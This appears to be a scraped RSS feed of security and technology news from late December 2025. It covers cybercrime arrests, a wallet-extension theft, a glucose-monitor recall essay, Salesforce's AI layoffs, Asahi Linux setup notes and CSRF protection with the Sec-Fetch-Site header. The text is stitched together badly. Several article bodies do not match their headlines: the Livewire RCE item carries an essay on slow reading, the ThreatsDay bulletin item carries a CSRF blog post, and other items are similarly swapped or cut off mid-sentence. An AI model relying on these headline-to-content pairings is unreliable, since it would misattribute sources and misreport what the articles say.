From high-profile arrests to major asset seizures, .In the last two weeks, Eurojust led a takedown of Ukrainian call centers defrauding Europeans of €10M and law enforcement seizing servers from E-Note crypto exchange laundering $70M through ransomware and account takeovers. Similarly, the arrest of Ukrainian national Victoria Dubranova for aiding Russian state-backed hacktivists, alongside Spanish authorities capturing a 19-year-old selling 64M stolen records, underscores the growing international effort to hold cybercriminals accountable.Significant infrastructure disruptions further amplify these successes. Convictions of cybercriminals targeting sensitive systems, such as the prison sentence for the “evil twin” WiFi hacker and seizure of the Cryptomixer crypto mixer with €1.3B laundered since 2016, are tangible results in stopping large-scale fraud.  to arrest Russian and DPRK-related cybercriminals and place sanctions on bulletproof hosting providers and foreign actors.International coordination has also been key this year. Interpol’s massive operations across Africa, including Operation Serengeti 2.0 and Operation Red Card, led to the arrests of thousands of suspects and the seizure of tens of millions in stolen assets. Europol dismantled SIMCARTEL, a global SIM-box fraud network, seizing servers, SIM cards, crypto, and luxury vehicles, while coordinated actions targeted Diskstation ransomware gangs and hacktivist infrastructures. In parallel, DOJ and CISA-led operations disrupted high-value schemes, including Prince Group’s $15B romance scam and multiple ransomware networks, while releasing decryptors for Phobos and 8Base victims to provide tangible relief. , introducing the Cyber Trust Mark certification for IoT devices and HIPAA encryption and MFA updates to ensure cyber safety from the top down.On the cybersecurity innovation front, CISA’s launch of Thorium, an open-source platform to help government agencies automate forensic investigations, and AI-enabled threat detection systems have allowed authorities to act on incidents more rapidly, from ransomware affiliate seizures to monitoring AI misuse..North Korea’s DPRK-linked hackers were prolific throughout 2025, stealing over $2B in cryptocurrency, blending traditional heists with espionage campaigns like Operation Contagious Interview targeting remote workers. Similarly, Iranian-linked UNK_SmudgedSerpent and China-linked TA415 campaigns leveraged phishing, fake platforms, and developer tooling to compromise high-value targets, from policy experts to enterprise networks.. VS Code extensions like Bitcoin Black and Codo AI exfiltrated credentials from crypto wallets, while NPM packages such as XORIndex and os-info-checker-es6 delivered multi-stage payloads. Novel malware families including SleepyDuck RAT and Betruger backdoors emerged, masquerading as popular extensions on the Open VSX open-source registry and supporting ransomware campaigns, respectively. Even AI-powered attacks emerged, with AkiraBot, Gamma AI phishing, and social engineering campaigns bypassing CAPTCHAs and traditional defenses to exploit SMBs and enterprise targets.State-aligned and nation-state threat actors also pursued espionage alongside financial crime. Fake job schemes and AI/crypto talent lures enabled targeted malware deployment, while advanced persistent threats like UNC3886 delivered stealthy backdoors to corporate and diplomatic networks. .The “Ugly” dimension of 2025 was . Large ransomware operations like CyberVolk resurfaced with AI-driven VolkLocker, automating negotiation, phishing, and multilingual attacks while leveraging Telegram for orchestration. AI also enhanced the capabilities of smaller, fragmented ransomware crews, allowing rapid targeting and payload deployment, though operational flaws sometimes limited effectiveness.Zero-day vulnerabilities were actively exploited across critical infrastructure and enterprise platforms. React2Shell in React/Next.js, Triofox (CVE-2025-12480), Oracle E-Business Suite (CVE-2025-61884), and ToolShell in SharePoint permitted full system compromise, highlighting that popular frameworks and business-critical software remain high-value targets. Cloud and AI services were similarly exploited; EchoLeak and Google Gemini LLM prompt injections enabled exfiltration of sensitive information without user interaction. .. Iranian-backed Crimson Sandstorm leveraged cyber reconnaissance to support missile strikes, while Chinese and DPRK actors continue to target aid operations, humanitarian NGOs, and government infrastructure, often exploiting IoT, industrial control systems, or open-source software to do so. In cross-border campaigns, long-dwell malware like BRICKSTORM and protocol-level exploits such as MadeYouReset created cascading impacts across critical networks and infrastructure.The risk factor in many attacks this year were amplified by third-party risks. Breaches of Discord vendors, Mixpanel, and GitHub Actions exposed vast quantities of PII and credentials, enabling subsequent ransomware, phishing, or espionage campaigns. .As 2025 draws to a close, one thing is clear: Cybersecurity has become more interconnected, more consequential, and more dependent on collective responsibility than ever before. From supply chain fragility and identity-based intrusion to the continued convergence of cybercrime and geopolitics, the challenges ahead demand deeper collaboration, stronger accountability, and a more deliberate approach to trust across the digital ecosystem.From all of us here at SentinelOne, we wish you a happy, healthy, and secure New Year 2026!]]></content:encoded></item><item><title>IoT Hack</title><link>https://www.schneier.com/blog/archives/2025/12/iot-hack.html</link><author>Bruce Schneier</author><category>security</category><pubDate>Fri, 26 Dec 2025 12:02:54 +0000</pubDate><source url="https://www.schneier.com/">Schneier on Security</source><content:encoded><![CDATA[Someone hacked an Italian ferry.It looks like the malware was installed by someone on the ferry, and not remotely.]]></content:encoded></item><item><title>Trust Wallet confirms extension hack led to $7 million crypto theft</title><link>https://www.bleepingcomputer.com/news/security/trust-wallet-chrome-extension-hack-tied-to-millions-in-losses/</link><author>Ax Sharma</author><category>security</category><pubDate>Fri, 26 Dec 2025 09:47:08 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Several users of the Trust Wallet Chrome extension report having their cryptocurrency wallets drained after installing a compromised extension update released on December 24, prompting an urgent response from the company and warnings to affected users.

  on December 23, 2025
I wrote
    last month about my diabetes diagnosis this year and my
  difficult choice to wear a proprietary device (called a
  ) on my arm 24/7
  to continuously monitor my glucose levels. Like my friend and colleague,
  Karen M. Sandler — who previously made a much higher-stakes choice to
  receive a proprietary implanted defibrillator to keep her safe given her
  genetic heart condition — I reluctantly chose to attach proprietary
  hardware and software to my body.The device itself is quite proprietary, but fortunately
    the 
    community has reverse engineered its activation and data collection
    protocols — creating an Android application that does a better job
    than the manufacturers' proprietary ones.Here in the USA, we strangely use capitalism as the center of our health care system. Two major for-profit competing brands of  are
  available here.  My diabetes specialist prefers the (ironically named)
  Freestyle Libre Plus from Abbott.  I (also rather strangely) bring a prescription
  for  to a pharmacy every month. On 2025-12-03, that pharmacy sent me an alarming text message (shown here). Abbott Killed Seven PatientsAfter reading that text, I
  found the
  USA  announcement.  My spouse cross-referenced the lot numbers while I read them off from all my Freestyle boxes.  I had indeed recently worn an
impacted device!Only because my diabetes is so early of a stage was I relatively safe.  The FDA
  reports that Freestyle injured over 700 people  and  with this bug.  Specifically, the bug caused the device to falsely report an
   glucose level.  Advanced stage diabetics use low
  reading information to inform them that they may have too much insulin
  currently.  The usual remedy is to eat something sugary to raise glucose in the blood. 
   Such should be done only with great care, as a false low reading can harm and even kill the patient (who eats a high-sugar-content item while glucose in the blood is, in fact, not low).Proprietary software in medical devices harming patients is not new.  In
  1985,
  the Therac-25
  killed three people.  In 2020, hundreds of patients who relied on a financially troubled tech startup found their occular implants suddenly unsupported. Some patients went blind as the devices powered down without updates.  There are more examples that I could include here, but rereading these horrific stories is frankly more than I can take right now when I think of fellow diabetes sufferers who were “killed by code” recently..Would FOSS Have Saved Patients' Lives?It's hubris for activists to guarantee that harm would be prevented if Freestyle had publicly released the
  hardware specifications and the complete, corresponding source code
  ().
   isn't immune to bugs —
  even dangerous ones.  However, in the centuries since the Enlightenment, we
  know that the scientific method  on public disclosure about
  data and wide-reaching peer review of past work.  FOSS (plus a publicly disclosed
  hardware design) wouid allow the millions of hardware and software engineers to
  peer-review the integrity, security, and safety of the devices to which
  patients entrust their lives.  We achieve the promise of humanity when we
  each entrust our safety and health to our entire community — not
  merely a single for-profit entity.We also will probably never know whether this issue was in hardware or
  software.  The bug disclosure is incredibly vague, and it remains unclear
  how much investigation was done (if any) by government regulators into this
  problem.  As a public policy and public health matter, the
  public  the technical details (software and
  hardware) of both the functioning device and the failed devices.  NGOs should be permitted to perform
  their own investigations and confirmations of public safety.Given that the hardware, software, and medical for-profit industries
refuse to put the rights, safety and security of patients first, wrongful
death lawsuits are typically the only way to hold these companies
  accountable.  Yet, there are  people who have not agreed
Abbott's toxic terms of their
  proprietary companion application — I guestimate 
that fewer than 1% of
  Freestyle-using patients have used Juggluco from their very start (and
  thus never agreed to Abbott's terms).  This is significant because Abbott includes a
  comprehensive one-way indemnity for themselves in the terms.  I hope that a
  class action suit begins soon on this matter, but I wonder and worry that
  so much of the class may have signed this indemnity (which may make the road to justice
  bumpier).Finally, I want to offer that if there is anyone out there who does
  tear-downs of extremely tiny electronic devices, I would be thrilled to
  find a volunteer who would like to see if we can either extract any
  software components from the device, or reverse-engineer the hardware.  I
  have saved and sanitized all of my prior .
  I'd gladly send one along
  to anyone who wants to give a try at taking them apart. (Contact SFC or contact me on the Fediverse (via Mastodon) if you're available to do this work.)For my part, I look forward (after the Vizio trial) to
 sending some patches to
  Juggluco and also getting Juggluco available in F-Droid.  Our best option in the face of
  these powerful medical device companies curtailing our rights is to invest
  our volunteer time into the edges where
   has
  resiliently worked around the constant roadblocks erected by bad
  actors. In a fascinating turn of events, at least one of my past monitors (of which I fortitously saved all the boxes with the lot/serial number on them) is listed in the FDA's spreadsheet as recalled lot, yet the serial number is listed as “ safe to use” on Abbott's webform  🤔 … I'm left wondering how I can trust Abbott to write reliable software stuck into my arm if they can't even write a web form that cross-references serial numbers to lots correctly 😬. ]]></content:encoded></item><item><title>Critical Flaw in Livewire Exposes Laravel Apps to Stealthy RCE, PoC Releases</title><link>https://securityonline.info/critical-flaw-in-livewire-exposes-laravel-apps-to-stealthy-rce-poc-releases/</link><author></author><category>security</category><pubDate>Fri, 26 Dec 2025 00:16:59 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

It’s not because I’m not enjoying it. It’s one of the most enjoyable reading experiences I can remember.From the beginning, I’ve read the whole thing aloud. I’ve found reading aloud helpful for staying engaged — limiting myself to mouth-speed rather than eye-speed means I won’t rush, miss important details, and then lose interest, which has always been a problem for me.At first I was anxious to read a 1,500-page book this way, because it would take so long. But, as someone pointed out to me, if I’m enjoying it, why would I want to be done with it sooner?So I tried slowing down , and discovered something. I slowed to a pace that felt almost absurd, treating each sentence as though it might be a particularly important one. I gave each one maybe triple the usual time and attention, ignoring the fact that there are hundreds of pages to go.This leisurely pace made Middle-Earth blossom before my eyes. When I paused after each comma, and let each sentence ring for a small moment after the period, the events of the story reached me with more weight and strength. That extra time gave space for Tolkien’s images and moods to propagate in my mind, which they did automatically.Some part of me still wanted to rush and get on with it, to make good time, to gloss over the songs and lore to get to Moria and Mount Doom and the other marquee moments of the story. But the more I ignored that impulse, the better the experience got.By offering the book about triple the usual amount of attentiveness, I was getting about triple the  (i.e. meaning, engagement, literary pleasure). Whatever the thing is that I’m seeking when I pick up a novel in the first place, there’s much more of it available at this pace.This effect reminded me of a paradox around eating I recognized long ago. When you slow down your eating speed, say to half or a third your default speed, you get much more enjoyment out of a smaller amount of food. The extra attention given to each bite allows more of the “good stuff,” whatever that is exactly, to reach you.What’s paradoxical is that it’s precisely the seeking of that “good stuff” that normally drives me to eat so quickly, and miss most of what I’m seeking. When you try to barrel ahead to access the good stuff quicker, you get less of it in the end. Slow down and much more of it is released.And it’s released automatically, in both reading and eating. You don’t have to search it out. The good stuff (the meaning in the text, the pleasure in the eating) just rises up to meet you in that extra time you give it. Slowing down, and offering more time to the act of consumption, immediately increases reading comprehension (and eating comprehension).Both are analogous to slowing down while you vacuum a carpet. If you pass the vacuum head too quickly, you miss half the dirt. Slow down, and you can hear how much more grit is sent skittering up the tube. The suction and bristles are working, but they need more time to do their work fully, to draw up the deeper-lying stuff.Question the default settingsIt seems that my default consumption speeds for reading and eating (and maybe everything else) reduce the rewards of those things significantly, undermining the point of doing either.Part of it is my own impatience. But I also suspect that modern living, with its infinite supply of consumables, tends to push our rate-of-intake dials too high. I’m not going to run out of books, or snacks, or opportunities to learn something. There’s always more, so not every crust of bread or printed page needs to be appreciated fully.It might sound like I’m just offering clichés – less is more, stop and smell the roses, take your time – and I guess I am. But clichés suffer the same issue: they are often profound insights, consumed and passed on too rapidly for their real meaning to register anymore. You really should stop and smell roses, as you know if you’re in the habit of doing that.At least see what happens when you reduce your consumption speed – of anything, but especially books, information, and food – by a half, or two thirds. Notice that (1) something in you really wants to plow through at the highest viable setting, and (2) how much more of the reward is released when you slow down anyway.As far as I can tell, almost everything becomes more satisfying when you give it more time and intention, even things like checking the mailbox or writing a shopping list.Slowing down your rate of consumption will inevitably change what you  to consume. Reading throwaway news articles or AI slop with great care and attention is only going to show you how empty of value it is. Reading dense writing in inky old books, crafted for your mind by great masters, becomes easier without the rushed pace, and the meaning just blooms out of it.Same with food. Try to savor a cheap, waxy “chocolate” bar, or a bag of store-brand cheese puffs, and you discover a harsh taste that you don’t want to look at too closely. Enjoy a homemade pastry with great attention, and discover there’s even more in it than you realized.Mass production is good in so many ways, but the faster we tend to consume its fruits, the more we end up seeking things for their glossy, candied surfaces. The more we go for these surface-level rewards, the more the culture focuses on offering only that part – such as TikTok videos, processed food, CGI-forward movies, and public discourse in the form of unexamined talking points.Who knows how far we’ve drifted from the best modes of consuming the things we value. Once something becomes a norm, it seems like an appropriate standard, no matter how much has been lost. Apparently, reading silently and alone was unusual until as late as the 18 century. Certainly sit-down meals and cooking at home were.I don’t mean to sound like a scold. Let’s say none of this is morally good or bad. It’s just that in so much of what we do, we could be getting much more of the part of it that we really seek — but it’s only available at slower speeds.If you’re curious, try consuming things more slowly, so slowly it seems silly to others — say a third your habitual speed — and see what rises up to meet you.Want to quit something in January?Recently I opened a discussion forum for Raptitude readers who want to give something up for the month of December (alcohol, social media, snacks, etc).It’s been a real success, and many people want to do something similar in January. If you want to quit something, or just give it up for a month, you’re invited to join.Follow this link at the end of this post to get an invite.]]></content:encoded></item><item><title>ChatGPT’s new formatting blocks make its UI look more like a task tool</title><link>https://www.bleepingcomputer.com/news/artificial-intelligence/chatgpts-new-formatting-blocks-make-its-ui-look-more-like-a-task-tool/</link><author>Mayank Parmar</author><category>security</category><pubDate>Thu, 25 Dec 2025 22:39:19 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[OpenAI has quietly rolled out 'formatting blocks,' which tweak GPT's layout to match the UI of the task it is supposed to execute.

Everything quoted below is translated. The page was first spotted in the “Google Pixel Hub” group on Telegram.The email address associated with your Google Account is the address you use to sign in to Google services. This email address helps you and others identify your account. If you’d like, you can change your Google Account email address that ends in gmail.com to a new email address that ends in gmail.com.This is new functionality that Google hasn’t detailed elsewhere yet, but says is “gradually rolling out to all users.”With this change, Google will allow users to change their “@gmail.com” email address to a new “@gmail.com” address with an altered username. After changing, Google details that your original email address will still receive emails at the same inbox as your new one and work for sign-in, and that none of your account access will change. Users will be unable to change or delete their email within 12 months of the change.When you change your Google Account email address from an email address ending in gmail.com to a new email address ending in gmail.com:You will receive emails at both your old and new email addresses.Data saved in your account, including photos, messages, and emails sent to your old email address, will not be affected.You can reuse your old Google Account email address at any time. However, you can’t create a new Google Account email address that ends with gmail.com for the next 12 months. You can’t delete your new email address either.You can sign in to Google services like Gmail, Maps, YouTube, Google Play, or Drive with your old or new email address. Google further details that your old Gmail address will still appear in some cases, and “won’t be immediately reflected in older instances” such as events on Calendar created before the change. You’ll also still be able to send emails from the old address. The old address remains yours and cannot be used by another user.The page is very detailed on the process, but the changes just aren’t live yet. Presumably, this support page detailing the process in Hindi went up a little earlier than intended, but it certainly seems that we’ll be hearing more about this change in the coming weeks.When the functionality goes live, users will be able to change their Gmail address via “My Account.” We’ll update this article if further information comes out.FTC: We use income earning auto affiliate links.More.]]></content:encoded></item><item><title>Fahrplan – 39C3</title><link>https://fahrplan.events.ccc.de/congress/2025/fahrplan/</link><author>rurban</author><category>dev</category><pubDate>Thu, 25 Dec 2025 18:40:14 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[

They’re classified as a sweet onion, and because of their mild flavor (they don’t make your eyes tear up), some folks can eat them like an apple. Most of my customers do.During a phone order one season – 2018 I believe – a customer shared this story where he smuggled some Vidalias onto his vacation cruise ship, and during each meal, would instruct the server to ‘take this onion to the back, chop it up, and add it onto my salad ‘. That story made me smile.Folks who love Vidalias, .Let me stop, though. I don’t want to get ahead of myself.How did all this start? I’m a web guy. I’m not a farmer.I’M ADDICTED TO DOMAIN NAMESOddly enough, it  start with an idea.Back in  2014, the domain name VidaliaOnions.com expired, and went up for auction. For some reason the original owner abandoned it, and being a Georgia native, I recognized it ’cause I was familiar with the industry. I’ve been buying expired or abandoned domain names for a while, and enjoy developing them into niche businesses. This one was different though – I backordered the domain as a spectator, but for kicks & giggles, I dropped in a bid around $2,200 ’cause I was confident I’d be outbid. 5 minutes later, I was the proud owner of VidaliaOnions.com. I had no idea what to do with it. Ready, fire, aim.After the domain landed in my account, I attempted to re-focus my attention on other projects, but the name kept clawing me. Like it was saying:William Faulkner had an interesting perspective on writing his characters – on how they essentially wrote themselves, and how  (Faulkner) served as a sortof mechanical in-between. His quote:I would say to get the character in your mind. Once he is in your mind, and he is right, and he’s true, then he does the work himself. All you need to do then is to trot along behind him and put down what he does and what he says… You’ve got to know the character. You’ve got to believe in him. You’ve got to feel that he is alive… After that, the business of putting him down on paper is mechanical. [source]The way Faulkner treats his characters, I treat domain name projects. I buy them with an intention to develop. And I let  take the lead. They’re the inspiration for the business itself. They guide me towards what they need to become. I’m just the dude behind the keyboard (sorta).Sometimes I buy them at auction, sometimes I buy them from original-owners. But universally, the domain name always comes first, the business idea comes second. I don’t usually rush into development. The path of some domains is apparent before I acquire. Others, the path reveals itself down the road. Vidalia was the latter. And after I acquired it, it kept nudging me.Build me… build me… you know how. And you  what I should be…After a month, I began to understand what it was telling me. That I buy pears from Harry & David every year, and I should mimic that same service for Vidalia Onions. Instead of farm-to-door pears, farm-to-door Vidalia Onions. An interesting idea, but daunting to approach. I’m not a farmer, I don’t have employees, I don’t have a packing shed. And I have no logistics or distribution system setup.But the domain name kept staring at me. ಠ~ಠ ////////“take the path to Nothing, and go Nowhere until you reach it.”And so I did. I’m just dumb enough to try a project of this complexity. The market size justified an online venture. Google Trends showed strong search volume for the phrase. And chefs around the world had already belted their praise over the ‘caviar of sweet onions’. So I just started down a path, with no end goal or milestone set. I just started going. No angel investor. No VC backer. I just used some modest profit from my other domain name developments to fund the endeavor. This was Feb of 2015.Once I began, I discovered there was a Vidalia Onion committee which represents all the Vidalia farmers. So I reached out to them.They were kind enough to listen to me.They introduced me to several farmers in the Vidalia region.I got along quite well with the 3rd farmer I met (Aries Haygood), so we decided to partner & give this a shot. His farm had been around for 25 years; they hadn’t focused on direct-to-consumer; but they understood its value. They operated a packing shed as well. And most importantly, they grew an award winning Vidalia. We conservatively estimated fifty (50) orders for our 2015 season. We ended up with over six hundred (600). While the farm concentrated on the Vidalia, I concentrated on customer service, marketing, branding, web development, & logistics. I didn’t have other projects that were this front-facing, customer wise. And I discovered I immensely enjoyed it.The more we both focused on these efforts, the more we grew. So much so, that other Vidalia operations began shutting down their mail order efforts and simply directed folks our way.We began testing alternate marketing avenues – a billboard on I-95 just south of Savannah, GA facing northbound traffic; sponsoring a bike rider headed cross country for charity; sponsoring a high school basketball team, as well as a grade school auction fundraiser. We added a phone order hotline, which – from time to time – generates more sales than online.We also made a few colossal mistakes, which were entirely of my doing, like blowing $10,000 on faulty shipping boxes from an ill-informed & misleading box manufacturer in Dalton, GA. (it happened early in our journey, and nearly forced me to shut down)Ultimately, I refused to let something like that kill this. Honestly, my customers would be quite upset if we disappeared. Last season, while I called a gentleman back regarding a phone order, his wife answered. While I introduced myself, she interrupted me mid-sentence and hollered in exaltation to her husband: ” THE VIDALIA MAN! THE VIDALIA MAN! PICK UP THE PHONE! ”At that moment, I realized we were doing something right. Something helpful. Something that was making a positive impact.I sometimes say I prefer projects that focus on purpose over profit. And as we enter our 5th season, this one continues to do just that.And it’s immensely gratifying. I feel so fortunate to be associated with this industry.I’m Peter Askew, and I sell onions on the internet.** below – from the field during harvest – these have been dug & are ready for clipping

The layoffs were initially framed by leadership as an efficiency win enabled by “agentic AI” systems capable of handling customer conversations at scale.Months later, the tone inside the company has shifted.Executives Acknowledge Overconfidence in AIIn recent internal discussions and public remarks, senior leaders at  acknowledged that the company was  in the ability of AI systems to fully replace human judgment, particularly in complex customer service scenarios.According to executives familiar with the transition, automated systems struggled with nuanced issues, escalations, and long-tail customer problems. The result was declining service quality, higher complaint volumes, and internal firefighting to stabilize operations that had once been handled by experienced staff.You cannot put a bot where a human is supposed to be“We assumed the technology was further along than it actually was,” one executive said privately, reflecting a growing recognition that AI performance in controlled demonstrations did not translate cleanly into real-world customer environments.Benioff Walks Back Earlier ConfidenceSalesforce CEO , who had previously celebrated AI as a transformative force that allowed the company to operate with fewer employees, has since softened that stance.Earlier this year, Benioff publicly stated that AI had enabled Salesforce to hire fewer people while maintaining growth. However, in subsequent interviews and internal communications, he acknowledged that human expertise remains critical, particularly in customer trust, relationship management, and problem resolution.On “The Logan Bartlett Show,” Benioff said that AI now handles roughly 50 percent of customer conversations and cited AI’s role in processing large numbers of previously unattended sales leads, framing it as an operational improvement.Executives now concede that removing large numbers of trained support staff created gaps that AI could not immediately fill, forcing teams to reassign remaining employees and increase human oversight of automated systems.Behind the scenes, the layoffs triggered challenges that were not anticipated when the AI rollout was approved.Former and current employees describe a loss of institutional knowledge, longer resolution times for complex cases, and an increased burden on remaining staff tasked with supervising AI outputs. In some instances, human agents were required to step in and correct AI-generated responses, eroding the productivity gains the layoffs were meant to deliver.Industry analysts note that this pattern mirrors a broader trend across the tech sector, where companies that moved quickly to replace workers with AI later discovered  that offset initial savings.From Replacement to RebalancingSalesforce has now begun reframing its AI strategy, shifting away from the language of replacement toward what executives call “rebalancing.” Rather than eliminating roles outright, the company says future AI deployments will emphasize , with humans retained in decision-critical and customer-facing positions.Quite vocally, the leadership has acknowledged that some of the reductions were , and that rebuilding trust with customers will require reinvesting in human expertise alongside automation.Salesforce’s reversal has become a reference point in ongoing debates about AI and employment. While automation remains a central pillar of the company’s long-term strategy, its experience has underscored a growing consensus among executives and analysts: AI can reduce workloads, but replacing skilled workers too quickly carries real operational risk.For a company that once positioned itself as a model for AI-first enterprise transformation, the episode now stands as a warning about the limits of technological optimism and the consequences of moving faster than the tools are ready to handle.]]></content:encoded></item><item><title>Google will finally allow you to change your @gmail.com address</title><link>https://www.bleepingcomputer.com/news/google/google-will-finally-allow-you-to-change-your-gmailcom-address/</link><author>Mayank Parmar</author><category>security</category><pubDate>Thu, 25 Dec 2025 14:30:58 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Google will finally allow you to change your @gmail address or create a new alias, according to a new support document.

As of writing, it’s very affordable with the 16 GB RAM, 256 GB SSD, 13.6” model available for $750.
As of writing, also Asahi Linux doesn’t support anything newer than M2.2011-2015: MacBook Air 13.3” with Intel Core i5 1.8 GHz, 8 GB of RAM, and 256 GB SSD (aftermarket upgrade from OWC). I installed Arch Linux on it with the i3 window manager.2014-2018: Dell XPS 13 Developer Edition. I used the Ubuntu 14.04 that came with it with the i3 window manager.2018-2024: Lenovo Thinkpad X1 Carbon Gen 6 with Intel Core i7 8640U, 16 GB of RAM, and 1 TB SSD. I installed Arch Linux on it with Sway.On the Asahi Linux there’s a one liner which you can paste into the Terminal.
It worked very well.
The only complaint is that it seemed to take hours to copy root.img and boot.img over at 150 KB/s.Since I intended to run it with the Sway Window Manager, and storage space is precious, I installed Fedora minimal.nmcli device wifi list
nmcli device wifi connect 'my_ssid' password 'mypassword'
and then I installed a bunch of packages I use, such as:sudo dnf install @sway-desktop-environment fish alacritty rofi ruff rclone pavucontrol-qt i3status mako pass syncthing maim xdg-user-dirs firefox rustup openssl-devel ncdu fd-find neovim
Then, I cloned my personal dotfile git repo and ran .
Of course, my configs weren’t meant for the MacBook, so I had to make some changes (which I’ve pushed to the dotfiles).By default, the whole row containing the notch is disabled, leading to a large-bezels look which I personally don’t like. There has got to be a way to use that screen real estate nicely!I re-enabled that part of the screen withgrubby --args=apple_dcp.show_notch=1 --update-kernel=ALL
Then, I put the Sway bar on the top to make a seamless appearance where the left and right side are used for useful information but the middle part is all black.
By experimentation I found that the notch is 56px tall.bar {
    position top
    status_command i3status
    modifier $mod
    tray_output primary
    # the height of the m2 macbook air's notch???
    height 56
    colors {
        background #000000
        statusline #cfcfd9
        separator #000000
        # border background text
        focused_workspace #0c0c0c #413459 #cfcfd9
        active_workspace #0c0c0c #413459 #cfcfd9
        inactive_workspace #0c0c0c #0c0c0c #cfcfd9
        urgent_workspace #2f343a #ff3300 #ffffff
    }
}
The full  shows a lot of information which might get occluded by the notch, and it doesn’t work with the MacBook battery levels by default, so I had to update the config:general {
        colors = true
        interval = 5
}

order += "wireless _first_"
order += "ethernet _first_"
order += "battery 0"
order += "tztime local"

wireless _first_ {
        format_up = "W: (%quality at %essid) %ip"
        format_down = "W: down"
}

ethernet _first_ {
        format_up = "E: %ip (%speed)"
        format_down = "E: down"
}

battery 0 {
        format = "%status %percentage"
        hide_seconds = true
        path = /sys/class/power_supply/macsmc-battery/uevent
}

tztime local {
        format = "%Y-%m-%d %H:%M:%S"
}
I usually don’t like having the bar on the top (as with macOS), since you won’t be able to move your mouse cursor to the top edge to, say, click on tabs.
Despite being mostly keyboard-driven, clicking on browser tabs with the mouse is something I still do often.To fix that, I prevented the mouse cursor from entering the bar on the top, with# use swaymsg -t get_inputs for the touchpad's identifier
input 1452:849:Apple_MTP_multi-touch map_to_region 0 56 2560 1608
In around September 2025, I switched from the native Swaybar to Waybar.
Somehow, I was running into some issues with ‘s handling of battery levels, and my computer ricing was due for a slight visual update anyway.
It’s nice to save a tiny bit of screen real estate with icons instead of pure text, but of course, it is somewhat slower than Swaybar as it needs to render graphical stuff.
The Waybar is still situated behind the notch.I am very impressed with how smooth and problem-free Asahi Linux is.
It is incredibly responsive and feels even smoother than my Arch Linux desktop with a 16 core AMD Ryzen 7945HX and 64GB of RAM.The touchpad in particular is stunningly good and just as good as native macOS.
The mouse cursor movement and two finger scroll with inertia just feel incredibly natural, much better than my old Thinkpad X1 Carbon.One of the main reasons for getting the laptop was to use it for line scan photography.
I was able to install the Alkeria SDK for ARM64 without any issues, even though it came as a deb file instead of an rpm.
I didn’t manage to get  to work properly (something about the architecture arm64 not matching Fedora’s convention of calling it aarch64?) so I just used bsdtar to extract the contents into the filesystem root, yolo!!!
The M2 compiles my code super fast!With high screen brightness and compiling lots of code, my battery went down from 100% to 60% after about 4.5 hours of use — not as good as the 15 hours of battery life on macOS but still pretty respectable.That said, it isn’t perfect.
Common issues are:higher battery drainage during sleep, so I usually just shut it down entirely when not using itno hardware acceleration for video decodingsome USB port quirks and external display quirksStill, fairly decent overall.FIGURE 3 Photo of me using my line scan camera with the Asahi Linux Macbook Air in London. Due to the Macbook’s tiny internal storage, I had to use an external 4 TB Crucial X8 SSD since the line scan camera racks up many gigabytes of data within seconds.]]></content:encoded></item><item><title>ThreatsDay Bulletin: Stealth Loaders, AI Chatbot Flaws AI Exploits, Docker Hack, and 15 More Stories</title><link>https://thehackernews.com/2025/12/threatsday-bulletin-stealth-loaders-ai.html</link><author></author><category>security</category><pubDate>Thu, 25 Dec 2025 14:01:00 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

And I did start along this tedious route. But then I bumped into a new way some people are dealing with CSRF attacks that is way simpler, which I describe below.Implementing a security featureAn often shared piece of advice is that you should never implement security features yourself. Instead, you should look for well established solutions built by people who think about security day in and day out.Unfortunately, as the lead (and only) maintainer of Microdot, I do not have an ecosystem of existing solutions available to me. Even though I gladly accept external contributions, most of the framework has been built by myself out of nothing. So in this case, like many other times before, I felt I had no choice but to go against the standard advice and write CSRF protection code by myself, because if I didn't do it then the feature would not be built.What is the first step when you need to build a security feature? Check out what OWASP has to say about the matter.So, in early November, I opened OWASP's CSRF Prevention Cheat Sheet page to see what was new and interesting in the world of CSRF protection. And I found that nothing of significance had changed.According to OWASP, the best CSRF protection you could get (at the time I checked) was still built around the idea of using anti-CSRF tokens. So I set off to implement this for Microdot.A disturbance in the (CSRF) forceI was happily making progress on my CSRF implementation, and then in early December, another random Internet user dropped an issue on the Flask repository, proposing that Flask adds support for "modern" CSRF protection. Modern? How could there be a new way to protect against CSRF that isn't mentioned by OWASP?This led me down a rabbit hole of blog posts and discussions spanning the Go and Ruby communities, plus a long discussion about this method on the OWASP GitHub repository itself, resulting in a pull request that added a mention of this method to the CSRF Cheat Sheet, only a couple of weeks after I went to this page looking for guidance for my own implementation.The so called "modern" method to protect against CSRF attacks is based on the Sec-Fetch-Site header, which all modern desktop and mobile browsers include in the requests they send to servers. According to Mozilla, all browsers released since March 2023 have support for this header.The  header can have one of four values:, when the request comes from the same origin as the target server, when the request comes from the same site, but not exactly the same origin (e.g. a different subdomain) as the target server, when the request comes from an origin that does not match the target server, when the request is originated by the userThe value of this header cannot be set via JavaScript, so the server can assume that a) if this header is present, then the client is a web browser, and b) the value of the header can be trusted. So basically, the server can reject requests that come with this header set to , and in essence that is all you need to do to protect against CSRF!After seeing this, I paused my work on the token-based CSRF implementation and spent a few hours to implement this modern approach. As always, the devil is in the details, so let's see what else I needed to do to build a complete solution.First of all, in some cases subdomains sharing the same registered domain may operate independently, and as such, it is not out of the question that one subdomain may attempt to attack another through CSRF. Depending on the level of trust an application has for other subdomains, a server may want to block requests that come with the  header set to . In Microdot, I have added an argument  to cover this case. I decided to err on the side of security, so the default is , meaning that requests from subdomains are also blocked.The other big problem is that not everyone is using a recent browser that implements this header. Looking at the browser compatibility for the  header, you can see that most browsers implemented this feature long ago, between 2019 and 2021, with one notable exception: Safari. Apple added this header to its browser in 2023, so it is reasonable to assume that there are still users out there running older browsers that do not support it.One option is to reject all requests that do not have the  header. This keeps everyone secure, but of course, there's going to be some unhappy users of old devices that will not be able to use your application. Plus, this would also reject HTTP clients that are not browsers. If this is not a problem for your use case, then great, but it isn't a good solution overall.From what I gathered from looking at other implementations of this method, an accepted solution is to use the  header as fallback when  is not implemented, since this header has been around for much longer. The last of the major browsers to add it were Firefox desktop in 2019 and Edge and Firefox mobile in 2020. Like , the  header is also a restricted header that is 